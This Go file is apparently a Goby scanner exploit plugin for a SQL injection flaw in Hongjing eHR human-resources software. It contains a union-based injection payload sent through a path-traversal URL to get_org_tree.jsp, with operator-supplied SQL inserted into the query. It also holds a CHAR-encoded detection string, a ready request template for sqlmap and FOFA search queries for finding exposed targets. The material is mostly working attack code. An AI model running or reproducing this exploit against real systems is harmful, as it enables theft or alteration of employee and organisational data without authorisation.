package exploits

import (
	"errors"
	"fmt"
	"regexp"
	"strings"

	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
)

func init() {
	expJson := `{
    "Name": "hjsofteHR /app_check_in/get_org_tree.jsp SQL Injection Vulnerability",
    "Description": "<p>The Hongjing eHR Human Resource Management Software is an integrated solution that combines human resource management with digital applications, designed to meet the dynamic, collaborative, process-oriented, and strategic needs of organizations.</p>",
    "Product": "HJSoft-HCM",
    "Homepage": "http://www.hjsoft.com.cn/",
    "DisclosureDate": "2024-08-19",
    "PostTime": "2024-08-19",
    "Author": "1538279017@qq.com",
    "FofaQuery": "body=\"宏景软件\" || (title=\"人力资源\" && body=\"/css/hcm/login.css\")",
    "GobyQuery": "body=\"宏景软件\" || (title=\"人力资源\" && body=\"/css/hcm/login.css\")",
    "Level": "2",
    "Impact": "<p>The danger of SQL injection vulnerabilities lies in the attacker's ability to manipulate database queries through maliciously crafted input, leading to the theft, alteration, or deletion of sensitive information in the database, and potentially taking full control of the application. Such attacks can result in data breaches, application downtime, financial losses, and legal liabilities, among other severe consequences.</p>",
    "Recommendation": "<p>An effective solution to prevent SQL injection is to use parameterized queries or prepared statements instead of embedding user input directly into SQL queries. This approach ensures that user input is safely handled and not executed as code. Additionally, input data should be strictly validated and sanitized, and database permissions should be minimized to reduce the potential attack surface.</p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "sql,sqlPoint",
            "show": ""
        },
        {
            "name": "sql",
            "type": "input",
            "value": "@@version",
            "show": "attackType=sql"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "SQL Injection",
        "2H1W"
    ],
    "VulType": [
        "SQL Injection"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "8",
    "Translation": {
        "CN": {
            "Name": "宏景eHR /app_check_in/get_org_tree.jsp SQL 注入漏洞",
            "Product": "HJSOFT-HCM",
            "Description": "<p>宏景eHR人力资源管理软件是一款人力资源管理与数字化应用相融合，满足动态化、协同化、流程化、战略化需求的软件<br></p>",
            "Recommendation": "<p>防止SQL注入的有效方法是使用参数化查询或预处理语句，而不是将用户输入直接嵌入到SQL查询中。这种方法确保用户输入的数据被安全地处理，不会被当作代码执行。此外，还应当对输入数据进行严格的验证和过滤，并对数据库的权限进行最小化配置，以减少潜在的攻击面。<br></p>",
            "Impact": "<p>SQL注入漏洞的危害在于攻击者可以通过恶意构造的输入，操控数据库查询，进而窃取、篡改或删除数据库中的敏感信息，甚至完全控制应用程序。这样的攻击可能导致数据泄露、应用瘫痪、财务损失、法律责任等严重后果。<br></p>",
            "VulType": [
                "SQL注入"
            ],
            "Tags": [
                "SQL注入",
                "两高一弱"
            ]
        },
        "EN": {
            "Name": "hjsofteHR /app_check_in/get_org_tree.jsp SQL Injection Vulnerability",
            "Product": "HJSoft-HCM",
            "Description": "<p>The Hongjing eHR Human Resource Management Software is an integrated solution that combines human resource management with digital applications, designed to meet the dynamic, collaborative, process-oriented, and strategic needs of organizations.<br></p>",
            "Recommendation": "<p>An effective solution to prevent SQL injection is to use parameterized queries or prepared statements instead of embedding user input directly into SQL queries. This approach ensures that user input is safely handled and not executed as code. Additionally, input data should be strictly validated and sanitized, and database permissions should be minimized to reduce the potential attack surface.<br></p>",
            "Impact": "<p>The danger of SQL injection vulnerabilities lies in the attacker's ability to manipulate database queries through maliciously crafted input, leading to the theft, alteration, or deletion of sensitive information in the database, and potentially taking full control of the application. Such attacks can result in data breaches, application downtime, financial losses, and legal liabilities, among other severe consequences.<br></p>",
            "VulType": [
                "SQL Injection"
            ],
            "Tags": [
                "SQL Injection",
                "2H1W"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "Variables": {},
    "PocId": "9943"
}`
	sendPayloaddosdsakacans := func(hostInfo *httpclient.FixUrl, sql string) (*httpclient.HttpResponse, error) {
		//POST请求
		setPostRequest := func(hostInfo *httpclient.FixUrl, url string, payload string, head map[string]string) (*httpclient.HttpResponse, error) {
			postRequest := httpclient.NewPostRequestConfig(url)
			postRequest.Timeout = 15
			postRequest.VerifyTls = false
			postRequest.FollowRedirect = false
			postRequest.Data = payload
			for headName, headValue := range head {
				postRequest.Header.Store(headName, headValue)
			}
			return httpclient.DoHttpRequest(hostInfo, postRequest)
		}
		//按需求选择自己的发包方式

		//---------------------------------------------
		//以下是发包具体内容,这里以POST请求为例
		//---------------------------------------------
		//漏洞的url
		url := `/templates/attestation/../../kq/app_check_in/get_org_tree.jsp`
		//拼接sql语句
		body := fmt.Sprintf("params=1=0 union select 1,2,%s,4--+", sql)
		header := map[string]string{
			"User-Agent":      "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0",
			"Accept":          "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
			"Accept-Language": "zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3",
			"Accept-Encoding": "gzip, deflate",
			"Dnt":             "1",
			"Referer":         hostInfo.FixedHostInfo,
			"Content-Type":    "application/x-www-form-urlencoded",
			"Cookie":          "SESS_IDS=prar0e5k1sg95nfsi446rejfp6",
		}
		resp, err := setPostRequest(hostInfo, url, body, header)
		if err != nil {
			return nil, err
		}
		//状态码可自定义,这里默认200
		if resp.StatusCode != 200 {
			return nil, errors.New("not response 200")
		}
		return resp, nil
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, hostInfo *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			sendPayload := sendPayloaddosdsakacans
			// 默认是MySQL / MariaDB数据库 : 用DATABASE()查询数据库名，用CONCAT()拼接字符
			// PostgreSQL : 用current_database()查询数据库名，用CONCAT()拼接字符
			// SQLite : 用database_list查询数据库名，用||拼接字符,(select sql from sqlite_master)查询表名
			// SQL Server : 用DB_NAME()查询数据库名，用+拼接字符
			// Oracle : 用SELECT name FROM v$database查询数据库名，用concat()拼接字符

			//检测逻辑,联合注入检测 这里模仿了sqlmap的检测逻辑,让它成功执行sql语句并回显一个字符串,然后我们去匹配

			//如果是其他类型的注入,请按照具体情况进行检测
			sql := "CHAR%28113%29%2BCHAR%28106%29%2BCHAR%2898%29%2BCHAR%28118%29%2BCHAR%28113%29%2BCHAR%2881%29%2BCHAR%2874%29%2BCHAR%28116%29%2BCHAR%28106%29%2BCHAR%28100%29%2BCHAR%2889%29%2BCHAR%28114%29%2BCHAR%28102%29%2BCHAR%28117%29%2BCHAR%2869%29%2BCHAR%28106%29%2BCHAR%28113%29%2BCHAR%2897%29%2BCHAR%28112%29%2BCHAR%2885%29%2BCHAR%2877%29%2BCHAR%28109%29%2BCHAR%2878%29%2BCHAR%2878%29%2BCHAR%28116%29%2BCHAR%2881%29%2BCHAR%2879%29%2BCHAR%2881%29%2BCHAR%28103%29%2BCHAR%28110%29%2BCHAR%28101%29%2BCHAR%2868%29%2BCHAR%2883%29%2BCHAR%2870%29%2BCHAR%2890%29%2BCHAR%28113%29%2BCHAR%28111%29%2BCHAR%28101%29%2BCHAR%2882%29%2BCHAR%28110%29%2BCHAR%2870%29%2BCHAR%2882%29%2BCHAR%2870%29%2BCHAR%2876%29%2BCHAR%28114%29%2BCHAR%28113%29%2BCHAR%28122%29%2BCHAR%28106%29%2BCHAR%28112%29%2BCHAR%28113%29"
			resp, err := sendPayload(hostInfo, sql)
			if err != nil {
				return false
			}
			if !strings.Contains(resp.Utf8Html, "qjbvqQJtjdYrfuEjqapUMmNNtQOQgneDSFZqoeRnFRFLrqzjpq") {
				return false
			}
			// 拼接SQL注入数据包的请求路径即可
			ss.VulURL = hostInfo.FixedHostInfo + `/templates/attestation/../../kq/app_check_in/get_org_tree.jsp`
			return true
		},
		func(expResult *jsonvul.ExploitResult, stepLogs *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			sendPayload := sendPayloaddosdsakacans
			attackType := goutils.B2S(stepLogs.Params["attackType"])
			sql := goutils.B2S(stepLogs.Params["sql"])
			//Switch ExpParams
			//若自己修改ExpParams,请自行修改switch case
			switch attackType {
			case "sql":
				resp, err := sendPayload(expResult.HostInfo, sql)
				if err != nil && strings.Contains(err.Error(), "not response 200") {
					expResult.Output = `漏洞利用失败:` + err.Error()
					expResult.Success = false
					return expResult
				}

				// 正则匹配利用结果,需自己修改
				// 注意正则匹配返回的结果的数组序号,一般是mathch[1],请先检测到是否匹配到内容,防止panic
				re := regexp.MustCompile(`<TreeNode id="(.*?)" text="(.*?)"`)
				matches := re.FindAllStringSubmatch(resp.Utf8Html, -1)
				if len(matches) < 1 {
					//正则失败
					expResult.Output = `Exploitation failed.`
					expResult.Success = false
					return expResult
				}
				expResult.Success = true

				expResult.Output = `The key points you need to extract is : ` + matches[1][2]
				return expResult

			case "sqlPoint":
				_, err := sendPayload(expResult.HostInfo, sql)
				if err != nil {
					expResult.Output = `Exploitation failed: ` + err.Error()
					expResult.Success = false
					return expResult
				}
				//sqlPoint,给用户跑sqlmap用,需修改对应的参数
				expResult.Success = true
				expResult.Output = `POST /templates/attestation/../../kq/app_check_in/get_org_tree.jsp HTTP/1.1
Host: ` + expResult.HostInfo.HostInfo + `
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
Accept-Encoding: gzip, deflate
Connection: close
Cookie: SESS_IDS=prar0e5k1sg95nfsi446rejfp6
Content-Type: application/x-www-form-urlencoded

params=1=0*
`
				return expResult
			//检查ExpParams是否设置正确
			default:
				expResult.Output = `Unknown attack type: ` + attackType
				expResult.Success = false
				return expResult
			}
		},
	))
}
